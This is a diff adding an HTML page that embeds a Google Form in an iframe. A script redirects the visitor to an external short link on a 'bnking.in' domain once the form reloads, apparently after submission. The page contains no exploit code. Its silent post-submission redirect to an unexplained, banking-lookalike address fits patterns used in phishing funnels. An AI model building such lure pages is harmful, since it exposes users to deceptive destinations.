@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Form + Instant Redirect</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: sans-serif;
+        background-color: #f9f9f9;
+      }
+
+      .iframe-container {
+        position: relative;
+        width: 100%;
+        padding-top: 150%; /* Adjust height ratio for mobile */
+        overflow: hidden;
+      }
+
+      .iframe-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="iframe-container">
+      <iframe
+        id="gform"
+        src="https://docs.google.com/forms/d/e/1FAIpQLSczSAPWBJ8Wm1U2cBEqsSUMrfVf4F3tmqvE8uHMto8TCzGb7Q/viewform?embedded=true"
+        allowfullscreen
+      >
+        Loading…
+      </iframe>
+    </div>
+
+    <script>
+      let loadCount = 0;
+      document.getElementById("gform").onload = function () {
+        loadCount++;
+        if (loadCount > 1) {
+          window.location.href = "https://wee.bnking.in/c/NmIyN2E2Z";
+        }
+      };
+    </script>
+  </body>
+</html>
